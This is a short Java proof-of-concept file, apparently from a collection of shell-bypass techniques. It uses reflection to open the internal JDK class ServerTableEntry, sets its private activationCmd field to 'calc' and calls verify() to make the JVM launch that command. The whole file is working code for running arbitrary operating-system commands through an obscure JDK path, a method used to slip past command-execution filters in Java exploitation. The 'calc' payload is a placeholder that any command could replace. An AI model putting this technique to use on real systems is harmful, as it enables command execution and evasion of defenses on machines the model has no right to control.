package shell.bypass;

import com.sun.corba.se.impl.logging.ActivationSystemException;
import com.sun.corba.se.spi.activation.RepositoryPackage.ServerDef;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.logging.Logger;

public class servertableentry  {
    public static void main(String[] args) throws Exception{
        Class C = Class.forName("com.sun.corba.se.impl.activation.ServerTableEntry");
        Constructor declaredConstructor = C.getDeclaredConstructor(ActivationSystemException.class, int.class, ServerDef.class, int.class ,String.class , boolean.class, boolean.class );
        declaredConstructor.setAccessible(true);
        Class l = Class.forName("java.util.logging.Logger");
        Constructor declaredConstructor1 = l.getDeclaredConstructor(String.class);
        declaredConstructor1.setAccessible(true);
        Logger o1 = (Logger)declaredConstructor1.newInstance("Firebasky");
        ActivationSystemException activationSystemException = new ActivationSystemException(o1);
        ServerDef serverDef = new ServerDef(null,null,"C:\\",null,null);
        Object o = declaredConstructor.newInstance(activationSystemException, 0, serverDef, 0, "", false, false);
        Field activationCmd = C.getDeclaredField("activationCmd");
        activationCmd.setAccessible(true);
        activationCmd.set(o,"calc");
        Method verify = C.getMethod("verify");
        verify.invoke(o);
    }
}
